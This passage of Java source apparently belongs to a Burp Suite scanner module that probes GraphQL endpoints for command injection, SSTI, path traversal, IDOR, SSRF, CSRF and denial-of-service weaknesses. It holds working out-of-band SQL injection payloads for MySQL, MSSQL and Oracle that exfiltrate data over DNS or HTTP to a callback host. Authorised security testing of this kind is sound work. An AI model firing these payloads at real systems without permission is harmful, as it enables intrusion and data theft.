                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Potential GraphQL NoSQL Injection (Data Exfil) via " + arg.argName,
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | Response size: " + respBody.length() + " vs baseline: " + baselineLen)
                        .description("NoSQL operator injection may have caused data exfiltration. "
                                + "Response was significantly larger than baseline.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testCmdiOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        String baselineQuery = buildQueryForArg(arg, "test123");
        String baselineBody = new Gson().toJson(Map.of("query", baselineQuery));
        HttpRequest baselineReq = buildGqlRequest(originalRequest, path, baselineBody);
        HttpRequestResponse baselineResult = api.http().sendRequest(baselineReq);
        perHostDelay();

        String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";

        for (String[] payloadInfo : CMDI_PAYLOADS) {
            checkInterrupted();
            String payload = payloadInfo[0];
            String technique = payloadInfo[1];

            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);

            long start = System.currentTimeMillis();
            HttpRequestResponse result = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            // Check for command output
            if ((respBody.contains("uid=") && !baselineRespBody.contains("uid="))
                    || (respBody.contains("root:") && !baselineRespBody.contains("root:"))
                    || (respBody.contains("bin/") && !baselineRespBody.contains("bin/"))) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL OS Command Injection via " + arg.argName,
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | Command output found in response")
                        .description("OS command injection confirmed in GraphQL argument '" + arg.argName
                                + "'. Command output was reflected in the response.")
                        .requestResponse(result)
                        .build());
                return;
            }

            // Time-based (sleep 5)
            if (payload.contains("sleep 5") && elapsed > 4500) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL OS Command Injection (Time-Based) via " + arg.argName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Response time: " + elapsed + "ms")
                        .description("Time-based command injection detected in GraphQL argument '" + arg.argName + "'.")
                        .requestResponse(result)
                        .build());
                return;
            }
        }
    }

    private void testSstiOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        String baselineQuery = buildQueryForArg(arg, "test123");
        String baselineBody = new Gson().toJson(Map.of("query", baselineQuery));
        HttpRequest baselineReq = buildGqlRequest(originalRequest, path, baselineBody);
        HttpRequestResponse baselineResult = api.http().sendRequest(baselineReq);
        perHostDelay();

        String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";

        for (String[] payloadInfo : SSTI_PAYLOADS) {
            checkInterrupted();
            String payload = payloadInfo[0];
            String technique = payloadInfo[1];
            String expected = payloadInfo[2];

            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            if (respBody.contains(expected) && !baselineRespBody.contains(expected)) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL SSTI via " + arg.argName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | Expected '" + expected + "' found in response")
                        .description("Server-Side Template Injection detected in GraphQL argument '" + arg.argName
                                + "'. The template engine evaluated the expression.")
                        .requestResponse(result)
                        .build());
                return;
            }
        }
    }

    private void testPathTraversalOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        String baselineQuery = buildQueryForArg(arg, "test123");
        String baselineBody = new Gson().toJson(Map.of("query", baselineQuery));
        HttpRequest baselineReq = buildGqlRequest(originalRequest, path, baselineBody);
        HttpRequestResponse baselineResult = api.http().sendRequest(baselineReq);
        perHostDelay();

        String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";

        for (String[] payloadInfo : PATH_TRAVERSAL_PAYLOADS) {
            checkInterrupted();
            String payload = payloadInfo[0];
            String expected = payloadInfo[1];
            String technique = payloadInfo[2];

            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            if (respBody.contains(expected) && !baselineRespBody.contains(expected)) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Path Traversal via " + arg.argName,
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | Found '" + expected + "' in response")
                        .description("Path traversal confirmed in GraphQL argument '" + arg.argName
                                + "'. Server file contents were returned.")
                        .requestResponse(result)
                        .build());
                return;
            }
        }
    }

    private void testOobOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
        String argPath = arg.parentType + "." + arg.fieldName + "." + arg.argName;

        // OOB SQLi (DNS exfil)
        String[][] oobSqlPayloads = {
                {"' AND 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.COLLAB\\\\a'))--", "MySQL OOB DNS"},
                {"'; EXEC master..xp_dirtree '\\\\COLLAB\\a'--", "MSSQL OOB xp_dirtree"},
                {"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB/\">%remote;]>'),'/l') FROM dual)||'", "Oracle OOB XXE"},
        };

        for (String[] payloadInfo : oobSqlPayloads) {
            checkInterrupted();
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];

            String collabPayload = collaboratorManager.generatePayload(
                    MODULE_ID, url, argPath,
                    "GraphQL " + technique,
                    interaction -> {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "GraphQL SQL Injection (OOB) via " + arg.argName,
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url)
                                .parameter(argPath)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Out-of-band SQL injection confirmed in GraphQL argument '"
                                        + arg.argName + "' via Burp Collaborator callback.")
                                .requestResponse(sentRequest.get())
                                .build());
                    }
            );
            if (collabPayload == null) continue;

            String payload = payloadTemplate.replace("COLLAB", collabPayload);
            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            sentRequest.set(api.http().sendRequest(req));
            perHostDelay();
        }

        // OOB SSRF via URL-type arguments
        if (arg.argName.toLowerCase().contains("url") || arg.argName.toLowerCase().contains("uri")
                || arg.argName.toLowerCase().contains("link") || arg.argName.toLowerCase().contains("href")
                || arg.argName.toLowerCase().contains("endpoint") || arg.argName.toLowerCase().contains("callback")) {

            String collabPayload = collaboratorManager.generatePayload(
                    MODULE_ID, url, argPath,
                    "GraphQL SSRF OOB via " + arg.argName,
                    interaction -> {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "GraphQL SSRF (OOB) via " + arg.argName,
                                        Severity.HIGH, Confidence.CERTAIN)
                                .url(url)
                                .parameter(argPath)
                                .evidence("Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("SSRF confirmed in GraphQL argument '" + arg.argName
                                        + "'. The server made an outbound request to the Collaborator payload.")
                                .requestResponse(sentRequest.get())
                                .build());
                    }
            );
            if (collabPayload != null) {
                String payload = "http://" + collabPayload + "/graphql-ssrf";
                String query = buildQueryForArg(arg, payload);
                String body = new Gson().toJson(Map.of("query", query));
                HttpRequest req = buildGqlRequest(originalRequest, path, body);
                sentRequest.set(api.http().sendRequest(req));
                perHostDelay();
            }
        }
    }

    // ==================== 4. AUTHORIZATION & IDOR TESTING ====================

    private void runAuthorizationTests(HttpRequest originalRequest, String path, String url, JsonObject schema) throws InterruptedException {
        if (!schema.has("types") || !schema.has("queryType") || schema.get("queryType").isJsonNull()) return;

        String queryTypeName = schema.getAsJsonObject("queryType").get("name").getAsString();
        JsonArray types = schema.getAsJsonArray("types");
        int maxIds = config.getInt("graphql.authz.idor.maxIds", 20);

        for (JsonElement typeEl : types) {
            JsonObject type = typeEl.getAsJsonObject();
            if (!queryTypeName.equals(safeString(type, "name"))) continue;
            if (!type.has("fields") || type.get("fields").isJsonNull()) continue;

            for (JsonElement fieldEl : type.getAsJsonArray("fields")) {
                checkInterrupted();
                JsonObject field = fieldEl.getAsJsonObject();
                String fieldName = safeString(field, "name");

                if (!field.has("args") || field.get("args").isJsonNull()) continue;
                JsonArray args = field.getAsJsonArray("args");

                // Look for ID/id arguments for IDOR testing
                if (config.getBool("graphql.authz.idor.enabled", true)) {
                    for (JsonElement argEl : args) {
                        JsonObject arg = argEl.getAsJsonObject();
                        String argName = safeString(arg, "name");
                        String argTypeName = resolveTypeName(arg.getAsJsonObject("type"));

                        if (("id".equalsIgnoreCase(argName) || "userid".equalsIgnoreCase(argName)
                                || "accountid".equalsIgnoreCase(argName))
                                && ("ID".equals(argTypeName) || "Int".equals(argTypeName) || "String".equals(argTypeName))) {

                            String dedupKey = "idor:" + fieldName + "." + argName;
                            if (!dedup.markIfNew(MODULE_ID, extractPath(url), dedupKey)) continue;

                            testIdorOnField(originalRequest, path, url, fieldName, argName, argTypeName,
                                    field.getAsJsonObject("type"), schema, maxIds);
                        }
                    }
                }
            }
        }
    }

    private void testIdorOnField(HttpRequest originalRequest, String path, String url,
                                  String fieldName, String argName, String argType,
                                  JsonObject returnType, JsonObject schema, int maxIds) throws InterruptedException {
        String selectionSet = getFieldSelection(returnType, schema, 0);
        int successCount = 0;
        List<String> accessibleIds = new ArrayList<>();

        for (int i = 1; i <= maxIds; i++) {
            checkInterrupted();
            String idValue = "Int".equals(argType) ? String.valueOf(i) : "\"" + i + "\"";
            String query = "{ " + fieldName + "(" + argName + ": " + idValue + ")"
                    + (selectionSet.isEmpty() ? "" : " { " + selectionSet + " }") + " }";
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result != null && result.response() != null) {
                String respBody = result.response().bodyToString();
                if (respBody != null && result.response().statusCode() == 200
                        && respBody.contains("\"data\"") && !respBody.contains("\"errors\"")
                        && !respBody.contains("null")) {
                    successCount++;
                    accessibleIds.add(String.valueOf(i));
                }
            }
        }

        if (successCount > 1) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "GraphQL IDOR: " + fieldName + " accessible via " + argName + " enumeration",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .parameter(fieldName + "." + argName)
                    .evidence("Accessible IDs: " + String.join(", ", accessibleIds)
                            + " (" + successCount + "/" + maxIds + " returned data)")
                    .description("IDOR detected on GraphQL field '" + fieldName + "'. Enumerating "
                            + argName + " values from 1-" + maxIds + " returned data for "
                            + successCount + " IDs. This indicates broken access control allowing "
                            + "horizontal privilege escalation.")
                    .remediation("Implement proper authorization checks on the resolver for '"
                            + fieldName + "'. Ensure users can only access their own records.")
                    .build());
        }
    }

    // ==================== 5. DOS & RESOURCE ABUSE ====================

    private void testBatchQuery(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "batch")) return;

        JsonArray batch = new JsonArray();
        for (int i = 0; i < 10; i++) {
            JsonObject q = new JsonObject();
            q.addProperty("query", "{ __typename }");
            batch.add(q);
        }
        String body = new Gson().toJson(batch);
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            String respBody = result.response().bodyToString();
            if (respBody != null && respBody.contains("__typename")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Batch Queries Not Limited",
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("10 batched queries all succeeded")
                        .description("Server accepts batched GraphQL queries without limits. "
                                + "Could be used for brute-force attacks or DoS.")
                        .remediation("Limit batch query count. In Apollo: "
                                + "allowBatchedHttpRequests: false or use a batch size limiter plugin.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testDeepNesting(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "deepnest")) return;

        String deepQuery = "{ __schema { types { fields { type { fields { type { fields { type { name } } } } } } } } }";
        String body = new Gson().toJson(Map.of("query", deepQuery));
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "GraphQL No Query Depth Limiting",
                            Severity.LOW, Confidence.FIRM)
                    .url(url)
                    .evidence("Deeply nested query (7 levels) processed successfully")
                    .description("Server processes deeply nested queries without depth limiting. "
                            + "Risk of DoS via recursive/nested queries.")
                    .remediation("Implement query depth limiting. Libraries: graphql-depth-limit (JS), "
                            + "graphql-query-complexity (JS), or built-in MaxQueryDepthRule.")
                    .requestResponse(result)
                    .build());
        }
    }

    private void testAliasDos(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "aliasdos")) return;

        StringBuilder sb = new StringBuilder("{ ");
        for (int i = 0; i < 100; i++) {
            sb.append("a").append(i).append(": __typename ");
        }
        sb.append("}");

        String body = new Gson().toJson(Map.of("query", sb.toString()));
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            String respBody = result.response().bodyToString();
            if (respBody != null && respBody.contains("a99")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Alias-Based Resource Exhaustion",
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("100 aliases for __typename all processed successfully")
                        .description("Server does not limit the number of aliases per query. "
                                + "Could be abused for DoS with expensive aliased fields.")
                        .remediation("Implement query complexity/cost analysis that accounts for aliases.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testCircularFragments(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "circfrag")) return;

        // Circular fragment spread test
        String query = "query { __typename ...A } fragment A on Query { __typename ...B } fragment B on Query { __typename ...A }";
        String body = new Gson().toJson(Map.of("query", query));
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null) {
            String respBody = result.response().bodyToString();
            int status = result.response().statusCode();

            // If the server returns 200 or takes very long, the circular detection may be absent
            if (status == 200 && respBody != null && !respBody.contains("\"errors\"")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Circular Fragment Spreading Allowed",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url)
                        .evidence("Circular fragment (A→B→A) processed without error")
                        .description("Server accepted a query with circular fragment spreads. "
                                + "This can cause infinite recursion leading to DoS.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testDirectiveOverloading(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "directiveoverload")) return;

        // Build a query with many @skip/@include directives
        StringBuilder sb = new StringBuilder("{ __typename ");
        for (int i = 0; i < 50; i++) {
            sb.append("@skip(if: false) ");
        }
        sb.append("}");

        String body = new Gson().toJson(Map.of("query", sb.toString()));
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            String respBody = result.response().bodyToString();
            if (respBody != null && respBody.contains("__typename") && !respBody.contains("\"errors\"")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Directive Overloading Allowed",
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("50 @skip directives on single field processed without limit")
                        .description("Server allows excessive directive use on a single field. "
                                + "This can be used to increase query cost and cause resource exhaustion.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    // ==================== 6. HTTP-LEVEL TESTS ====================

    private void testGetMethodQuery(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "getmethod")) return;

        String encodedQuery = URLEncoder.encode("{ __typename }", StandardCharsets.UTF_8);
        String getUrl = path + "?query=" + encodedQuery;

        HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                "GET " + getUrl + " HTTP/1.1\r\n"
                        + "Host: " + originalRequest.httpService().host() + "\r\n"
                        + "Accept: application/json\r\n\r\n");

        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            String respBody = result.response().bodyToString();
            if (respBody != null && respBody.contains("__typename")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Queries Accepted via GET Method",
                                Severity.INFO, Confidence.CERTAIN)
                        .url(url)
                        .evidence("Query { __typename } succeeded via GET ?query= parameter")
                        .description("The GraphQL endpoint accepts queries via GET method query parameters. "
                                + "This enables CSRF attacks and caching of sensitive query results. "
                                + "GET method mutations are particularly dangerous.")
                        .remediation("Only accept POST for queries, or at minimum reject mutations via GET.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testContentTypeBypass(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "ctbypass")) return;

        // Try sending GraphQL query as form-urlencoded
        String formBody = "query=" + URLEncoder.encode("{ __typename }", StandardCharsets.UTF_8);

        HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                "POST " + path + " HTTP/1.1\r\n"
                        + "Host: " + originalRequest.httpService().host() + "\r\n"
                        + "Content-Type: application/x-www-form-urlencoded\r\n"
                        + "Content-Length: " + formBody.length() + "\r\n\r\n"
                        + formBody);

        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null && result.response().statusCode() == 200) {
            String respBody = result.response().bodyToString();
            if (respBody != null && respBody.contains("__typename")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Content-Type Bypass (Form URL-Encoded)",
                                Severity.LOW, Confidence.CERTAIN)
                        .url(url)
                        .evidence("Query succeeded with Content-Type: application/x-www-form-urlencoded")
                        .description("The GraphQL endpoint accepts queries via form URL-encoded content type. "
                                + "This can bypass CSRF protections that rely on Content-Type checking, "
                                + "since browsers can send form-encoded requests cross-origin without CORS preflight.")
                        .remediation("Strictly validate Content-Type to only accept application/json.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    private void testCsrfOnMutations(HttpRequest originalRequest, String path, String url, JsonObject schema) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "csrf")) return;

        // Need a mutation type to test
        if (!schema.has("mutationType") || schema.get("mutationType").isJsonNull()) return;
        String mutTypeName = schema.getAsJsonObject("mutationType").get("name").getAsString();

        // Find first mutation for testing
        String testMutation = null;
        JsonArray types = schema.getAsJsonArray("types");
        for (JsonElement typeEl : types) {
            JsonObject type = typeEl.getAsJsonObject();
            if (mutTypeName.equals(safeString(type, "name")) && type.has("fields") && !type.get("fields").isJsonNull()) {
                JsonArray fields = type.getAsJsonArray("fields");
                if (fields.size() > 0) {
                    testMutation = safeString(fields.get(0).getAsJsonObject(), "name");
                    break;
                }
            }
        }
        if (testMutation == null) return;

        // Send mutation without Origin/Referer headers
        String query = "mutation { " + testMutation + " { __typename } }";
        String body = new Gson().toJson(Map.of("query", query));

        HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                "POST " + path + " HTTP/1.1\r\n"
                        + "Host: " + originalRequest.httpService().host() + "\r\n"
                        + "Content-Type: application/json\r\n"
                        + "Content-Length: " + body.length() + "\r\n\r\n"
                        + body);

        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result != null && result.response() != null) {
            int status = result.response().statusCode();
            String respBody = result.response().bodyToString();
            // If mutation was processed (not rejected for CSRF)
            if (status == 200 && respBody != null && !respBody.contains("CSRF")
                    && !respBody.contains("csrf") && !respBody.contains("forbidden")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Mutations May Be Vulnerable to CSRF",
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("Mutation '" + testMutation + "' accepted without Origin/Referer headers")
                        .description("GraphQL mutations were accepted without Origin or Referer headers. "
                                + "Combined with GET query acceptance or form-encoded content type, "
                                + "this may allow cross-site request forgery attacks on mutations.")
                        .remediation("Implement CSRF protection: validate Origin header, use CSRF tokens, "
                                + "or require custom headers (e.g. X-Requested-With) for mutations.")
                        .requestResponse(result)
                        .build());
            }
        }
    }

    // ==================== 7. ERROR & INFO DISCLOSURE ====================

    private void testVerboseErrors(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "verboserr")) return;

        // Send deliberately malformed queries
        String[] malformed = {
                "{",
                "{ __typename(",
                "query { NONEXISTENT_FIELD_12345 }",
                "mutation { }",
                "{ __schema { INVALID } }",
        };

        for (String query : malformed) {
            checkInterrupted();
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            // Check for stack traces, file paths, or excessive error details
            if (respBody.contains("stack") || respBody.contains("stacktrace")
                    || respBody.contains("at com.") || respBody.contains("at org.")
                    || respBody.contains("node_modules") || respBody.contains("File \"")
                    || respBody.contains(".java:") || respBody.contains(".py:")
                    || respBody.contains(".js:") || respBody.contains("Traceback")
                    || respBody.contains("Exception in")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Verbose Error Messages (Stack Trace)",
                                Severity.LOW, Confidence.CERTAIN)
                        .url(url)
                        .evidence("Malformed query triggered stack trace/file path disclosure in error response")
                        .description("The GraphQL endpoint returns verbose error messages including stack traces "
                                + "or file paths. This leaks internal implementation details to attackers.")
                        .remediation("Disable debug mode in production. Sanitize error messages to not include "
                                + "stack traces, file paths, or internal details.")
                        .requestResponse(result)
                        .build());
                return;
            }
        }
    }

    private void testDebugMode(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "debug")) return;

        String query = "{ __typename }";
        String body = new Gson().toJson(Map.of("query", query));
        HttpRequest req = buildGqlRequest(originalRequest, path, body);
        HttpRequestResponse result = api.http().sendRequest(req);
        perHostDelay();

        if (result == null || result.response() == null) return;
        String respBody = result.response().bodyToString();
        if (respBody == null) return;

        boolean hasDebugInfo = false;
        List<String> debugIndicators = new ArrayList<>();

        if (respBody.contains("\"tracing\"")) {
            hasDebugInfo = true;
            debugIndicators.add("tracing");
        }
        if (respBody.contains("\"extensions\"") && (respBody.contains("\"debug\"") || respBody.contains("\"cacheControl\""))) {
            hasDebugInfo = true;
            debugIndicators.add("extensions.debug/cacheControl");
        }
        if (respBody.contains("\"trace\"")) {
            hasDebugInfo = true;
            debugIndicators.add("trace");
        }

        if (hasDebugInfo) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "GraphQL Debug/Tracing Mode Enabled",
                            Severity.LOW, Confidence.CERTAIN)
                    .url(url)
                    .evidence("Debug indicators found: " + String.join(", ", debugIndicators))
                    .description("The GraphQL endpoint returns debug/tracing information in extensions. "
                            + "This reveals timing data, resolver execution details, and internal metadata.")
                    .remediation("Disable tracing and debug extensions in production. "
                            + "In Apollo: plugins: [ApolloServerPluginInlineTraceDisabled()]")
                    .requestResponse(result)
                    .build());
        }
    }

    private void testFrameworkFingerprint(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "fingerprint")) return;

        // Collect responses from a normal query and a bad query
        String goodBody = new Gson().toJson(Map.of("query", "{ __typename }"));
        String badBody = new Gson().toJson(Map.of("query", "{ NONEXISTENT_FIELD_XYZ }"));

        HttpRequest goodReq = buildGqlRequest(originalRequest, path, goodBody);
        HttpRequest badReq = buildGqlRequest(originalRequest, path, badBody);

        HttpRequestResponse goodResult = api.http().sendRequest(goodReq);
        perHostDelay();
        HttpRequestResponse badResult = api.http().sendRequest(badReq);
        perHostDelay();

        Set<String> detected = new LinkedHashSet<>();

        for (HttpRequestResponse result : new HttpRequestResponse[]{goodResult, badResult}) {
            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            // Check response headers too
            String serverHeader = "";
            for (var h : result.response().headers()) {
                if ("server".equalsIgnoreCase(h.name()) || "x-powered-by".equalsIgnoreCase(h.name())) {
                    serverHeader += h.value() + " ";
                }
            }
            String combined = respBody + " " + serverHeader;

            for (String[] fp : FRAMEWORK_FINGERPRINTS) {
                if (combined.toLowerCase().contains(fp[0].toLowerCase())) {
                    detected.add(fp[1]);
                }
            }
        }

        if (!detected.isEmpty()) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "GraphQL Framework Fingerprint",
                            Severity.INFO, Confidence.FIRM)
                    .url(url)
                    .evidence("Detected framework(s): " + String.join(", ", detected))
                    .description("The GraphQL implementation was fingerprinted from error patterns "
                            + "and response characteristics: " + String.join(", ", detected)
                            + ". This information helps target framework-specific vulnerabilities.")
                    .build());
        }
    }

    // ==================== SCHEMA PARSING HELPERS ====================

    /**
     * Extract all injectable String/ID arguments from query and mutation types.
     */
    private List<InjectableArg> extractInjectableArgs(JsonObject schema) {
        List<InjectableArg> args = new ArrayList<>();
        extractArgsFromRootType(schema, "queryType", args);
        extractArgsFromRootType(schema, "mutationType", args);
        return args;
    }

    private void extractArgsFromRootType(JsonObject schema, String rootTypeKey, List<InjectableArg> result) {
        if (!schema.has(rootTypeKey) || schema.get(rootTypeKey).isJsonNull()) return;
        String rootTypeName = schema.getAsJsonObject(rootTypeKey).get("name").getAsString();
        if (!schema.has("types")) return;

        for (JsonElement typeEl : schema.getAsJsonArray("types")) {
            JsonObject type = typeEl.getAsJsonObject();
            if (!rootTypeName.equals(safeString(type, "name"))) continue;
            if (!type.has("fields") || type.get("fields").isJsonNull()) continue;

            for (JsonElement fieldEl : type.getAsJsonArray("fields")) {
                JsonObject field = fieldEl.getAsJsonObject();
                String fieldName = safeString(field, "name");

                if (!field.has("args") || field.get("args").isJsonNull()) continue;
                for (JsonElement argEl : field.getAsJsonArray("args")) {
                    JsonObject arg = argEl.getAsJsonObject();
                    String argName = safeString(arg, "name");
                    String argTypeName = resolveTypeName(arg.getAsJsonObject("type"));

                    // Only inject into String and ID type arguments
                    if ("String".equals(argTypeName) || "ID".equals(argTypeName)) {
                        result.add(new InjectableArg(rootTypeName, fieldName, argName, argTypeName,
                                field.getAsJsonObject("type"), field, schema));
                    }
                }
            }
        }
    }

    /**
     * Build a valid GraphQL query for a specific argument with an injected value.
     */
    private String buildQueryForArg(InjectableArg arg, String value) {
        // Escape the value for GraphQL string
        String escaped = value.replace("\\", "\\\\").replace("\"", "\\\"");

        StringBuilder query = new StringBuilder();
        boolean isMutation = "Mutation".equalsIgnoreCase(arg.parentType)
                || arg.parentType.toLowerCase().contains("mutation");
        query.append(isMutation ? "mutation" : "query");
        query.append(" { ").append(arg.fieldName).append("(");

        // Build args — put our injected value for the target arg, placeholders for others
        JsonArray allArgs = arg.fieldDef.getAsJsonArray("args");
        List<String> argParts = new ArrayList<>();
        for (JsonElement argEl : allArgs) {
            JsonObject argDef = argEl.getAsJsonObject();
            String name = safeString(argDef, "name");
            if (name.equals(arg.argName)) {
                argParts.add(name + ": \"" + escaped + "\"");
            } else {
                argParts.add(name + ": " + getPlaceholder(argDef.getAsJsonObject("type")));
            }
        }
        query.append(String.join(", ", argParts));
        query.append(")");

        // Add selection set if return type is an object
        String selectionSet = getFieldSelection(arg.returnType, arg.schema, 0);
        if (!selectionSet.isEmpty()) {
            query.append(" { ").append(selectionSet).append(" }");
        }

        query.append(" }");
        return query.toString();
    }

    private void generateSampleQueries(JsonObject schema, String endpointKey) {
        List<String> queries = new ArrayList<>();

        if (schema.has("queryType") && !schema.get("queryType").isJsonNull()) {
            String queryTypeName = schema.getAsJsonObject("queryType").get("name").getAsString();
